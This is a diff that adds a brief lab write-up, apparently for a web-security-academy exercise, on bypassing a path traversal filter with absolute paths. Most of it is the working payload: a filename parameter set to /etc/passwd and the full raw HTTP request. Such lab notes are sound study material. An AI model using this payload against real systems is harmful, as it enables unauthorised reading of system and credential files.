@@ -1,0 +1,25 @@
+File path traversal, traversal sequences blocked with absolute path bypass
+
+Fairly standard. We can replace the file name with a file source.
+
+So instead of 
+
+https://acd81fdb1f2f728a80d577da001100af.web-security-academy.net/image?filename=31.jpg
+
+We can do
+
+https://acd81fdb1f2f728a80d577da001100af.web-security-academy.net/image?filename=/etc/passwd
+
+Remember to do it in repeater so that the contents properly show up.
+
+Request:
+GET /image?filename=/etc/passwd HTTP/1.1
+Host: acd81fdb1f2f728a80d577da001100af.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=ymFxQdvfCYdAGRka2j0mRA46sbOSAVpI
+Upgrade-Insecure-Requests: 1
+
